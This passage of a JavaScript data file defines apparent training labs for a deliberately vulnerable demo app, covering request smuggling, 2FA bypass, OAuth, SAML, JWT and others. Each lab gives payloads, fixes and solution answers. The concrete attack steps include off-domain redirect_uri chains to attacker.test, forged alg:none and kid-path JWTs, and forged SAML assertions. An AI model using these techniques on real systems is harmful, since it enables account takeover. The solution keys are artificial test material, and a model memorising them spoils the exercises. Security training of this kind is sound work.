          hard: "The rule is narrowed further to only match a static extension in query-value position, but that's still enough to trigger caching of a private response."
        },
        reportImpact: {
          easy: "Sensitive account data (API key) becomes accessible to anyone who requests the same poisoned URL, no authentication required.",
          medium: "Same impact as easy — the fix only closed one specific construction, not the underlying pattern-matching approach.",
          hard: "Same impact as easy — demonstrates that narrowing a flawed detection rule usually just narrows the required payload, not the risk."
        },
        solutionSteps: {
          easy: ["Visit /vuln/cache-deception/account/anything.js", "The FLAG appears alongside the private API key."],
          medium: ["Visit /vuln/cache-deception/account?a=x.js (path stays clean, extension is in the query string).", "The FLAG appears."],
          hard: ["Visit /vuln/cache-deception/account?callback=x.js (extension specifically in a query VALUE position).", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "request-smuggling", category: "server-logic", title: "HTTP Request Smuggling", shortTitle: "Request Smuggling",
        tags: ["server-logic", "request-smuggling", "request", "smuggling"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Protocol Analyzer", blurb: "See how a front-end and back-end can disagree about where a request ends.",
        inputContext: "Raw HTTP request (headers)",
        goal: { explain: "This lab is a textual analyzer (not a live two-server exploit): it shows how a Content-Length-based front-end and a Transfer-Encoding-based back-end can disagree about a request's boundary — the real mechanism behind CL.TE smuggling.",
          example: "A request with BOTH Content-Length and Transfer-Encoding: chunked headers can be read completely differently depending on how strictly the back-end parses the TE header.",
          mission: ["Get the analyzer to detect a desync using the specific header construction required for this difficulty.", "A FLAG appears whenever it does."] },
        difficultyNotes: { easy: "The back-end recognizes a plain Transfer-Encoding: chunked header — the pre-filled example already desyncs.", medium: "The back-end now only recognizes chunked encoding as part of a comma-separated list, e.g. 'Transfer-Encoding: identity, chunked' — edit the header to that form.", hard: "The back-end now requires TWO separate Transfer-Encoding header lines (it uses the last one) — add a line 'Transfer-Encoding: identity' directly above the existing chunked line." },
        why: "Real HTTP implementations genuinely vary in how strictly they parse Transfer-Encoding — some accept comma-lists, some only honor the last of duplicate headers — and any such disagreement between front-end and back-end is exploitable.",
        fix: "Ensure front-end and back-end servers agree on a single, strict parsing strategy (ideally reject any ambiguous request with both headers, or duplicate Transfer-Encoding headers, per RFC 7230).",
        reportSummary: {
          easy: "The back-end recognizes a simple, single Transfer-Encoding: chunked header, and the pre-filled example already contains a mismatched Content-Length, producing an immediate desync.",
          medium: "The back-end only recognizes chunked encoding within a comma-separated Transfer-Encoding value — the simple single-value header from the easy tier is no longer sufficient.",
          hard: "The back-end only recognizes chunked encoding when TWO separate Transfer-Encoding header lines are present, using the last one — neither the easy nor medium constructions are sufficient here."
        },
        reportImpact: {
          easy: "Can smuggle a hidden request into another user's connection in a real CL.TE setup, leading to request hijacking or cache poisoning.",
          medium: "Same impact as easy — a comma-separated Transfer-Encoding value is valid per spec and a realistic real-world parsing discrepancy.",
          hard: "Same impact as easy — duplicate Transfer-Encoding headers are a well-documented real desync technique when front-end and back-end pick different occurrences."
        },
        solutionSteps: {
          easy: ["Click Analyze on the pre-filled example (Content-Length + Transfer-Encoding: chunked, both present).", "The FLAG appears once a desync is detected."],
          medium: ["Edit the Transfer-Encoding header to: Transfer-Encoding: identity, chunked", "Click Analyze — the FLAG appears."],
          hard: ["Add a second header line above the existing one: Transfer-Encoding: identity, followed by the existing Transfer-Encoding: chunked line.", "Click Analyze — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "race-conditions", category: "server-logic", title: "Race Conditions", shortTitle: "Race Conditions",
        tags: ["server-logic", "race-conditions", "race", "conditions"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Gift Card", blurb: "Redeem more value than should be possible by racing requests.",
        inputContext: "API request (concurrency)",
        goal: { explain: "A race condition happens when a check ('is there enough balance?') and the action ('deduct it') aren't atomic, so concurrent requests can all pass the check before any of them updates the balance.",
          example: "Firing several redemption requests at the exact same time can let you redeem more than your balance should allow.",
          mission: ["Redeem once normally.", "Fire several requests simultaneously and over-redeem.", "A FLAG appears once you've redeemed MORE than 2 times from a $50 balance (2 is what a safe system would allow)."] },
        difficultyNotes: { easy: "Firing 3 requests simultaneously is enough to over-redeem (2 would just be the normal legitimate limit).", medium: "Needs about 6 simultaneous requests to reliably win the race (narrower window).", hard: "Needs ~20 simultaneous requests — the window is very narrow but still exploitable with enough concurrency." },
        why: "The balance check and the balance deduction happen in separate steps with a gap between them (simulated here with an artificial delay), so concurrent requests can all observe the pre-deduction balance.",
        fix: "Make the check-and-deduct operation atomic (e.g. a single conditional database update, or a proper lock/transaction) so concurrent requests can't both pass the same check.",
        reportSummary: {
          easy: "A relatively wide 400ms artificial delay between check and deduct makes the race trivially winnable with just 3 concurrent requests.",
          medium: "A narrower 220ms window requires more concurrent requests (around 6) to reliably land more than 2 inside the gap.",
          hard: "A tight 120ms window still yields to sheer concurrency — around 20 simultaneous requests reliably wins even a narrow race."
        },
        reportImpact: {
          easy: "Financial loss via double-spending / over-redemption of value — trivially achievable.",
          medium: "Same financial impact, requiring only moderately more concurrent requests.",
          hard: "Same financial impact — demonstrates that a narrow race window reduces but doesn't eliminate exploitability if an attacker can fire enough concurrent requests."
        },
        solutionSteps: {
          easy: ["Set 'simultaneous requests' to 3 and click Fire.", "More than 2 redemptions succeed from the $50 balance. The FLAG appears."],
          medium: ["Set 'simultaneous requests' to 6 and click Fire (may need a retry or two).", "The FLAG appears once redemptions exceed 2."],
          hard: ["Set 'simultaneous requests' to 20 and click Fire (may need a retry or two given the narrow window).", "The FLAG appears once redemptions exceed 2."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // -------------------------------------------------------------- AUTH
      {
        id: "2fa-bypass", category: "auth", title: "2FA Bypass", shortTitle: "2FA Bypass",
        tags: ["auth", "2fa-bypass", "2fa", "bypass"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Login", blurb: "Skip or brute-force past a two-factor step.",
        inputContext: "Form field / session state",
        goal: { explain: "A 2FA implementation is only as strong as what happens AFTER password entry but BEFORE the OTP is verified.",
          example: "If the account page doesn't check an 'otpVerified' flag, you can navigate straight past the OTP screen.",
          mission: ["Log in with any username/password.", "Defeat the OTP step using the technique for this difficulty.", "A FLAG appears on successful access to the account page."] },
        difficultyNotes: { easy: "The account page never checks OTP status at all — just navigate straight to it.", medium: "OTP is required, but the verify endpoint accepts ANY code as correct.", hard: "The real code is checked, but there's no attempt limit — brute-force all 100 two-digit codes." },
        why: "The account page's authorization check doesn't (at easy) or barely (at medium/hard) validate that a real second factor was actually completed.",
        fix: "Only grant full session privileges after OTP success, validate the actual code value, and rate-limit/lock out after a few failed attempts.",
        reportSummary: {
          easy: "The account page grants access without ever checking whether OTP verification happened at all.",
          medium: "OTP verification is checked for, but the verification endpoint itself accepts any submitted code as correct.",
          hard: "The real code is properly checked, but with no rate limiting a full brute force of the 100-code space is trivially fast."
        },
        reportImpact: {
          easy: "Complete 2FA bypass — the second factor provides no protection whatsoever.",
          medium: "Same complete bypass — verification exists in form but not in substance.",
          hard: "2FA is only as strong as its rate limiting — a small code space with no throttling is brute-forceable in seconds."
        },
        solutionSteps: {
          easy: ["Log in with any credentials.", "Navigate directly to the account page, skipping /verify entirely.", "The FLAG appears."],
          medium: ["Log in with any credentials.", "Submit any 2-digit code (e.g. 00) to /verify.", "Navigate to the account page — the FLAG appears."],
          hard: ["Log in with any credentials.", "Use the 'Try all 100 codes' button to brute-force the real code.", "Navigate to the account page — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "weak-password", category: "auth", title: "Weak Password Checks", shortTitle: "Weak Password Checks",
        tags: ["auth", "weak-password", "weak", "password"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Login", blurb: "Exploit missing complexity rules and missing rate limiting.",
        inputContext: "Form field",
        goal: { explain: "Weak password policy plus no rate limiting is a classic combo: guessable passwords, and nothing stopping you from guessing as many times as you like.",
          example: "Registration accepts '123' as a password, and the login endpoint never locks out repeated failed attempts.",
          mission: ["Register an account with a trivially weak password.", "Brute-force the admin account's password using the built-in wordlist.", "A FLAG appears on a successful login."] },
        difficultyNotes: { easy: "Admin's password is an obvious top-10 password, no attempt limit.", medium: "Admin's password needs the full built-in wordlist, still no attempt limit.", hard: "Same wordlist, but a lockout kicks in after 5 attempts — bypassable by starting a fresh session (clear cookies) between attempts." },
        why: "No password strength enforcement plus no (or session-keyed, easily reset) rate limiting allows practical brute-forcing.",
        fix: "Enforce a real password policy, and rate-limit/lock out by account (or IP), not by a client-resettable session.",
        reportSummary: {
          easy: "The admin account uses an obvious, top-10-list password with no login attempt limiting at all.",
          medium: "The admin password isn't in the top 10, but the built-in wordlist still finds it in a handful of attempts, still with no limiting.",
          hard: "A lockout exists after 5 failed attempts, but it's tracked per-session — a fresh session (new cookies) resets the counter entirely."
        },
        reportImpact: {
          easy: "Admin account takeover in a single guess for anyone who tries common passwords.",
          medium: "Admin account takeover within a small, automatable wordlist run.",
          hard: "The lockout is trivially bypassed by clearing cookies, so brute-forcing remains practical despite the apparent protection."
        },
        solutionSteps: {
          easy: ["Run the built-in wordlist against the admin account — 'admin123' hits almost immediately.", "The FLAG appears in the success response."],
          medium: ["Run the built-in wordlist — 'Summer2024!' succeeds after a few tries.", "The FLAG appears."],
          hard: ["Run the wordlist; if locked out after 5 attempts, clear cookies (or open a private window) and continue.", "'Tr41n1ng!2026' eventually succeeds. The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "brute-force", category: "auth", title: "Brute Force Attack", shortTitle: "Brute Force",
        tags: ["auth", "brute-force", "brute", "force"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Staff Portal", blurb: "Enumerate valid usernames via a side-channel, then brute-force the password.",
        inputContext: "Form field (repeated requests)",
        goal: { explain: "Real brute-forcing usually starts with username enumeration: finding out WHICH usernames are valid before wasting effort guessing passwords for accounts that don't exist. Apps leak this in surprising ways even after 'fixing' the obvious one.",
          example: "An error message that says 'no such user' vs 'wrong password' tells an attacker exactly which usernames are worth attacking.",
          mission: ["Figure out which candidate username is real for this difficulty.", "Log in successfully — a FLAG appears once you do."] },
        difficultyNotes: { easy: "The error message itself reveals whether the username exists.", medium: "Messages are unified, but response time differs — check the serverProcessingMs field.", hard: "Message and timing are both unified — but a lockout only triggers for a REAL username after repeated attempts, itself proving validity." },
        why: "Removing the obvious enumeration vector (distinct error messages) doesn't remove every side-channel — timing and lockout behavior can leak the same information.",
        fix: "Return truly identical responses (message, timing, and any side-effects like lockout) regardless of whether the username exists, and rate-limit by IP/account in a way that doesn't itself leak validity.",
        reportSummary: {
          easy: "Login error messages explicitly differ between 'no such user' and 'incorrect password', trivially enabling username enumeration.",
          medium: "Error messages are unified, but the server's response time differs measurably depending on whether the username is valid.",
          hard: "Both message and timing are unified, but an account lockout after repeated failures only occurs for valid usernames — the lockout message itself is a side-channel."
        },
        reportImpact: {
          easy: "Trivial, instant username enumeration followed by targeted password brute-forcing.",
          medium: "Same enumeration outcome via a subtler but still practical timing side-channel.",
          hard: "Same enumeration outcome via a lockout side-channel — demonstrates that fixing the obvious vectors doesn't guarantee the underlying information isn't still leaking."
        },
        solutionSteps: {
          easy: ["Try each candidate username with any password; only 'jsmith' returns \"Incorrect password\" instead of \"No such user.\"", "Log in as jsmith with password Winter2025!", "The FLAG appears."],
          medium: ["Try each candidate username; jsmith's response takes noticeably longer (serverProcessingMs: 300 vs 50).", "Log in as jsmith with password Winter2025!", "The FLAG appears."],
          hard: ["Send 5 failed attempts against a candidate username; only jsmith eventually returns a lockout message, proving it's valid.", "(The lockout response itself includes the FLAG confirming enumeration — no further login needed.)"]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "password-reset", category: "auth", title: "Password Reset Issues", shortTitle: "Password Reset",
        tags: ["auth", "password-reset", "password", "reset"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Password Reset", blurb: "Exploit a predictable or reusable reset token.",
        inputContext: "URL parameter (token)",
        goal: { explain: "Password reset flows are only as safe as their tokens — predictable tokens or tokens that can be reused both defeat the whole mechanism.",
          example: "If a token is just base64(username), anyone can compute a valid token for any account without ever requesting a reset for them.",
          mission: ["Compute (don't request!) a token for the 'admin' account directly.", "A FLAG appears once admin's password is reset via a token you computed or found, not one legitimately issued to you."] },
        difficultyNotes: { easy: "The token is just base64(username) — compute it directly.", medium: "The token is the username reversed plus '-2024' — compute it directly.", hard: "The token is properly random — but a leaked, already-used token for 'admin' is shown in a debug log, and reuse isn't blocked." },
        why: "Tokens are either derived predictably from public information (easy/medium) or never invalidated after use and exposed via a debug log (hard).",
        fix: "Use cryptographically random, single-use, short-expiry tokens, and never log/expose them anywhere outside the actual email delivery.",
        reportSummary: {
          easy: "Reset tokens are simply base64(username) — computable for any account without ever triggering a real reset request.",
          medium: "Reset tokens follow a slightly obfuscated but still fully predictable pattern (reversed username + fixed suffix).",
          hard: "Tokens are properly random and unpredictable, but a debug log exposes an already-used token, and the reset endpoint doesn't reject reused tokens."
        },
        reportImpact: {
          easy: "Instant account takeover of any user, including admin, with zero interaction with the real reset flow.",
          medium: "Same takeover risk — the obfuscation adds negligible attacker effort.",
          hard: "Even properly random tokens are unsafe if reuse isn't blocked and they're exposed via logging — a different but equally real failure mode."
        },
        solutionSteps: {
          easy: ["Compute token = base64('admin') = YWRtaW4=", "Submit it on the reset form with a new password.", "The FLAG appears."],
          medium: ["Compute token = reverse('admin') + '-2024' = nimda-2024", "Submit it with a new password.", "The FLAG appears."],
          hard: ["Copy the leaked token shown in the 'recently sent emails' debug panel (marked used).", "Submit it with a new password anyway — reuse isn't blocked.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "oauth-misconfig", category: "auth", title: "OAuth Misconfiguration", shortTitle: "OAuth Misconfig",
        tags: ["auth", "oauth-misconfig", "oauth", "misconfig"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp ID — OAuth", blurb: "Redirect an authorization code to an attacker-controlled URL.",
        inputContext: "URL parameter (redirect_uri)",
        goal: { explain: "If an OAuth authorize endpoint doesn't strictly validate redirect_uri, an attacker can have the authorization code delivered to their own server instead of the real app.",
          example: "redirect_uri=https://attacker.test with no validation sends the code straight to the attacker.",
          mission: ["Try an attacker redirect_uri directly.", "At higher difficulty, find the bypass for the validation in place.", "A FLAG appears whenever the code would genuinely be delivered off-domain."] },
        difficultyNotes: { easy: "No validation on redirect_uri at all.", medium: "Validated via a naive substring check — try a lookalike domain containing the trusted string.", hard: "Validated via a startsWith check — chain through the Open Redirect lab, which itself starts with the trusted domain." },
        why: "redirect_uri validation uses a substring or prefix check instead of an exact allowlist match, and doesn't account for open-redirect chaining on the trusted domain itself.",
        fix: "Validate redirect_uri against an exact, pre-registered allowlist of full URLs — never a substring/prefix check — and fix any open redirects on the trusted domain too.",
        reportSummary: {
          easy: "No validation whatsoever on redirect_uri — any destination is accepted.",
          medium: "A substring check for 'securecorp-demo.test' is satisfied by any domain that merely contains that string, including an attacker's own lookalike domain.",
          hard: "A startsWith check on the trusted domain is satisfied by chaining through an existing open redirect ON that trusted domain."
        },
        reportImpact: {
          easy: "Authorization codes (and the account access they grant) are trivially exfiltrated to any attacker-chosen domain.",
          medium: "Same exfiltration risk — the substring check is bypassed with a single crafted lookalike domain.",
          hard: "Demonstrates that fixing redirect_uri validation isn't enough on its own if the trusted domain has its own unrelated open redirect to chain through."
        },
        solutionSteps: {
          easy: ["redirect_uri=https://attacker.test", "The FLAG appears confirming off-domain delivery."],
          medium: ["redirect_uri=https://securecorp-demo.test.attacker.test", "Contains the trusted substring but resolves to attacker.test. The FLAG appears."],
          hard: ["redirect_uri=https://securecorp-demo.test/vuln/open-redirect?next=https://attacker.test", "Starts with the trusted domain, then redirects off-domain via the chained bug. The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "saml-vulns", category: "auth", title: "SAML Vulnerabilities", shortTitle: "SAML",
        tags: ["auth", "saml-vulns", "saml", "vulns"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp SSO — SAML", blurb: "Forge a SAML assertion because the signature isn't really checked.",
        inputContext: "Form field (base64 assertion)",
        goal: { explain: "SAML SSO trusts the assertion's claims (who you are, your role) — but only if the cryptographic signature is actually verified. If it isn't, you can just edit the assertion.",
          example: "Changing <Subject>guest</Subject> to <Subject>admin</Subject> in the base64 blob and resubmitting logs you in as admin.",
          mission: ["Decode the sample assertion.", "Edit the Subject to admin and satisfy whatever check exists at this difficulty.", "A FLAG appears once you're logged in as admin specifically."] },
        difficultyNotes: { easy: "Signature is ignored entirely — just tamper and resubmit.", medium: "A Signature field must be present, but its value is never actually verified — any placeholder text works.", hard: "Also requires a NotOnOrAfter timestamp — but since it's part of the assertion you control, just set it in the future." },
        why: "The server parses claims out of the assertion but never cryptographically verifies the signature against the identity provider's public key.",
        fix: "Always cryptographically verify the SAML assertion's signature against a trusted, pinned IdP certificate before trusting any claim inside it.",
        reportSummary: {
          easy: "The Signature field is completely ignored — any Subject/role claim is trusted as-is.",
          medium: "A Signature field must merely be present (any non-empty text) — its value is never cryptographically checked.",
          hard: "A NotOnOrAfter expiry is also required, but since it's part of the attacker-controlled assertion body, it's trivially set to a future date."
        },
        reportImpact: {
          easy: "Complete authentication bypass — impersonate any user, including admin, with a hand-edited assertion.",
          medium: "Same complete bypass — a placeholder signature satisfies a presence check that isn't a real verification.",
          hard: "Same complete bypass — every 'protection' added is itself just another attacker-controlled field, since real signature verification is never performed."
        },
        solutionSteps: {
          easy: ["Decode the sample assertion, change Subject to admin and role to admin.", "Re-encode as base64 and submit.", "The FLAG appears."],
          medium: ["Same edit as easy, plus add any placeholder <Signature>x</Signature>.", "Re-encode and submit. The FLAG appears."],
          hard: ["Same edits as medium, plus add <NotOnOrAfter>2099-01-01T00:00:00Z</NotOnOrAfter>.", "Re-encode and submit. The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "session-fixation", category: "auth", title: "Session Fixation", shortTitle: "Session Fixation",
        tags: ["auth", "session-fixation", "session", "fixation"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Customer Portal", blurb: "A genuine 3-step chain: fix a session id, let the victim log in, then reuse it.",
        inputContext: "Cookie",
        goal: { explain: "If an app accepts a client-supplied session id and doesn't issue a fresh one after login, an attacker who gets a victim to use a pre-chosen session id can simply reuse that same id after the victim authenticates.",
          example: "An attacker sends a victim a link containing a specific session id. If the victim logs in without the id changing, the attacker's copy of that same id is now authenticated too.",
          mission: ["Step 1: note (or set) a fixed session id.", "Step 2: 'log in' while keeping that same id.", "Step 3: reuse the original id — a FLAG appears if it's now authenticated."] },
        difficultyNotes: { easy: "The session id is never regenerated on login at all.", medium: "Cookie-based session ids ARE regenerated now — but a URL parameter can still override the id at login time.", hard: "Both cookie and URL-param fixation are patched — except a 'keep me signed in' flow that skips regeneration." },
        why: "Each fix addressed one specific way the session id could be supplied without addressing the underlying rule: never let login continue using a pre-existing, client-supplied identifier.",
        fix: "Always issue a brand-new, server-generated session id immediately upon successful authentication, regardless of how the pre-login session was established.",
        reportSummary: {
          easy: "The session id present before login is reused unchanged after login succeeds.",
          medium: "Cookie-supplied ids are regenerated, but a URL query parameter can still fix the id at login time.",
          hard: "Both prior paths are fixed, but a 'keep me signed in' flow reintroduces the same lack of regeneration."
        },
        reportImpact: {
          easy: "Full account takeover — an attacker who fixes a victim's session id inherits their authenticated session.",
          medium: "Same takeover via a URL parameter instead of a cookie.",
          hard: "Same takeover via a specific login flow that was overlooked when the general fix was applied."
        },
        solutionSteps: {
          easy: ["Visit the lab with ?sessionid=ATTACKERCHOSEN1, then log in.", "Recheck that same session id — the FLAG appears."],
          medium: ["Log in directly with ?sessionid=ATTACKERCHOSEN3 in the URL.", "Recheck that session id — the FLAG appears."],
          hard: ["Fix a session id via cookie, then log in with the 'keep me signed in' checkbox checked.", "Recheck that session id — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "jwt-vulnerabilities", category: "auth", title: "JWT Vulnerabilities", shortTitle: "JWT",
        tags: ["auth", "jwt-vulnerabilities", "jwt", "vulnerabilities", "expert-tier"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API — JWT Auth", blurb: "Forge a valid admin token using real HMAC-SHA256 cryptography.",
        inputContext: "HTTP header (Authorization: Bearer)",
        goal: { explain: "JWTs are only as secure as how they're verified — accepting alg:none, using a weak secret, confusing signing algorithms, or trusting attacker-controlled header fields to pick the verification key are all real, common issues.",
          example: "A token with {\"alg\":\"none\"} and no signature is sometimes accepted as valid if the verification code doesn't explicitly reject that algorithm.",
          mission: ["Use the Token Forge Helper to build a token claiming role:admin.", "Get it accepted by the /admin endpoint for this tier — a FLAG appears once it is."] },
        difficultyNotes: { easy: "alg:none with an empty signature is accepted outright.", medium: "alg:none is blocked — but the real signing secret is a weak, guessable string.", hard: "The secret is strong, but an algorithm-confusion bug verifies HS256 tokens using the published RS256 public key as the HMAC secret.", expert: "Algorithm confusion is fixed. Keys are now looked up by the token's own \"kid\" header, though — and an unrecognized kid is read as a raw path from this app's internal file store, whose exact content becomes the HMAC key." },
        why: "The verification code trusts the algorithm — and at expert tier, the KEY ITSELF — named or referenced in the token's own header, instead of enforcing one fixed, expected algorithm and key from a trusted source.",
        fix: "Hardcode the expected algorithm and never read it from the token itself. Never resolve a signing/verification key from an attacker-controlled header field (kid) without validating it against a strict, closed allowlist of known key ids — never treat it as a file path.",
        reportSummary: {
          easy: "Tokens with alg:none and an empty signature are accepted without any verification.",
          medium: "alg:none is rejected, but the real HMAC secret is a short, guessable string.",
          hard: "The real secret is strong, but HS256 tokens are (buggily) verified using the RS256 public key as if it were an HMAC secret.",
          expert: "Algorithm confusion is closed, but the \"kid\" header — fully attacker-controlled — is used to resolve the verification key, and an unrecognized kid is read as an arbitrary file path whose content becomes the key."
        },
        reportImpact: {
          easy: "Trivial full authentication bypass — forge any claim with no cryptographic knowledge at all.",
          medium: "Full forgery once the weak secret is guessed or brute-forced.",
          hard: "Full forgery using only publicly published information — no secret-guessing needed at all.",
          expert: "Full forgery by pointing kid at any internal file whose content is knowable — a classic real-world JWT attack class (documented CVEs use kid values like \"../../../../dev/null\" for exactly this reason)."
        },
        solutionSteps: {
          easy: ["Forge a token with alg=none, payload {\"user\":\"admin\",\"role\":\"admin\"}, and no secret.", "Submit it to /admin — the FLAG appears."],
          medium: ["Forge a token with alg=HS256, the same admin payload, and secret \"secret123\".", "Submit it — the FLAG appears."],
          hard: ["Forge a token with alg=HS256, the same admin payload, and the published public key text as the signing secret.", "Submit it — the FLAG appears."],
          expert: ["Forge a token with alg=HS256, kid=\"/app/templates/en.txt\", the same admin payload, and \"Welcome to SecureCorp Demo!\" as the signing secret (the forge helper pre-fills exactly this).", "Submit it — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ------------------------------------------------------------- INFRA
      {
        id: "cloud-storage-misconfig", category: "infra", title: "Cloud Storage Misconfiguration", shortTitle: "Cloud Storage",
        tags: ["infra", "cloud-storage-misconfig", "cloud", "storage", "misconfig"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Cloud Storage", blurb: "Access data in a misconfigured public storage bucket.",
        inputContext: "URL parameter",
        goal: { explain: "Cloud storage buckets (S3-style) are sometimes left publicly listable and/or readable by mistake.",
          example: "Listing the bucket reveals object keys you were never meant to see, like employee-backup.csv.",
          mission: ["Try listing the bucket.", "Fetch an interesting-looking private object directly.", "A FLAG appears whenever a private (non-public) object is actually read."] },
        difficultyNotes: { easy: "Both listing and reading any object work with no restriction.", medium: "Listing is disabled, but any object is still directly readable if you know/guess its exact key.", hard: "Both need a 'sig' parameter — but its value is never actually validated, so any value works." },
        why: "Access control relies on 'security through obscurity' (no listing) or a signature parameter that's checked for presence but never cryptographically validated.",
        fix: "Require real authenticated, least-privilege access to every object (not just disabling listing), and validate signed URLs cryptographically with expiry.",
        reportSummary: {
          easy: "Both listing and object reads work with zero access control — the entire bucket is openly browsable.",
          medium: "Listing is disabled, but this is 'security through obscurity' — any guessed or known key is still directly readable.",
          hard: "A 'sig' parameter is required, giving the appearance of signed-URL protection, but its value is never actually validated cryptographically."
        },
        reportImpact: {
          easy: "Full disclosure of every object in the bucket, including private backups and confidential files.",
          medium: "Same disclosure risk for any attacker who guesses or learns object key names through other means.",
          hard: "The 'signed URL' pattern is present in name only — it provides no real protection since any signature value is accepted."
        },
        solutionSteps: {
          easy: ["Click 'List bucket' to enumerate all object keys.", "Fetch any listed key, e.g. private/ceo-notes.txt.", "The FLAG appears."],
          medium: ["Skip listing (it's disabled) — directly request key=private/ceo-notes.txt or key=employee-backup.csv.", "The FLAG appears."],
          hard: ["Request the same private key, adding any value to the sig field, e.g. sig=x.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "subdomain-takeover", category: "infra", title: "Subdomain Takeover", shortTitle: "Subdomain Takeover",
        tags: ["infra", "subdomain-takeover", "subdomain", "takeover"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp DNS Zone Lookup", blurb: "Claim an abandoned service that a dangling DNS record still points to.",
        inputContext: "DNS / Host header (simulated)",
        goal: { explain: "If a DNS CNAME still points at a third-party service that's since been deleted/abandoned, anyone can often register that same slug on the third-party service and serve their own content under the trusted domain.",
          example: "A subdomain's CNAME can still point at a hosting slug nobody claimed anymore — the domain itself differs by difficulty here.",
          mission: ["Look up subdomains to find the dangling one for this difficulty.", "Claim it and preview the result.", "A FLAG appears once your claimed content is served under SecureCorp's domain."] },
        difficultyNotes: { easy: "old-blog.securecorp-demo.test is dangling, among only 4 subdomains to check.", medium: "old-blog no longer exists — beta.securecorp-demo.test is dangling instead, among 8 subdomains.", hard: "beta no longer exists — archive.securecorp-demo.test is dangling instead, and you must explicitly request claim verification to see its real status." },
        why: "DNS wasn't cleaned up when the underlying third-party service/slug was decommissioned, leaving a dangling pointer anyone can claim — a pattern that keeps recurring as different subdomains get decommissioned over time.",
        fix: "Remove DNS records immediately when decommissioning any third-party-hosted service, and periodically audit all CNAMEs for dangling targets.",
        reportSummary: {
          easy: "old-blog.securecorp-demo.test's CNAME target is immediately visible as unclaimed among a short list of 4 subdomains.",
          medium: "A different subdomain (beta) is now the dangling one, found by checking a longer, more realistic list of 8.",
          hard: "Yet another subdomain (archive) is dangling, and its claim status is hidden by default — requiring an explicit verification step before it's confirmed."
        },
        reportImpact: {
          easy: "Full content control of a legitimate-looking subdomain — useful for phishing or malware hosting.",
          medium: "Same impact, requiring more reconnaissance effort across a realistic-sized subdomain list.",
          hard: "Same impact — demonstrates that dangling records can hide in plain sight until someone actually checks claim status explicitly."
        },
        solutionSteps: {
          easy: ["Look up old-blog.securecorp-demo.test — it's flagged as unclaimed immediately.", "Claim sc-oldblog.fakehost-service.test with your own content, then preview the subdomain.", "The FLAG appears."],
          medium: ["Check each of the 8 known subdomains until beta.securecorp-demo.test shows as unclaimed.", "Claim sc-beta.fakehost-service.test and preview — the FLAG appears."],
          hard: ["Look up archive.securecorp-demo.test with the verify checkbox enabled to see its real claim status.", "Claim sc-archive.fakehost-service.test and preview — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "source-map-leak", category: "infra", title: "Source Map Leakage", shortTitle: "Source Map Leak",
        tags: ["infra", "source-map-leak", "source", "map", "leak"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Web App", blurb: "Reconstruct original source code (and a leaked key) from a JS source map.",
        inputContext: "Static file discovery",
        goal: { explain: "Source maps let browsers show original (unminified) source in DevTools — but if a source map is publicly served, anyone can use it to fully reconstruct the original source, including any secrets left in it.",
          example: "A source map's sourcesContent field contains the exact original file — comments, hardcoded keys, everything.",
          mission: ["View the minified JS bundle.", "Find and fetch its source map for this tier.", "A FLAG appears embedded in the reconstructed source."] },
        difficultyNotes: { easy: "The JS file links its own map via a sourceMappingURL comment.", medium: "The comment is removed — but the map still exists at the conventional filename.js.map path.", hard: "The conventional path doesn't exist — but a build manifest.json reveals the real, hashed map filename." },
        why: "Each 'fix' removed one way of discovering the map, without removing the map file itself from being publicly servable.",
        fix: "Never serve source maps (or the sourcesContent they contain) in production — build and deploy them only for internal error-tracking tooling that isn't public-facing.",
        reportSummary: {
          easy: "The minified JS file links directly to its own source map via a standard comment.",
          medium: "The comment is removed, but the map file is still reachable at the standard app.min.js.map naming convention.",
          hard: "The standard path is gone, but a publicly-reachable build manifest discloses the real, hash-named map file."
        },
        reportImpact: {
          easy: "Full original source disclosure, including a hardcoded internal API key.",
          medium: "Same disclosure, requiring only the well-known source map naming convention.",
          hard: "Same disclosure via a chained discovery step — a realistic two-hop reconnaissance chain."
        },
        solutionSteps: {
          easy: ["View /assets/app.min.js, follow the sourceMappingURL comment to app.min.js.map.", "The FLAG appears in the reconstructed source."],
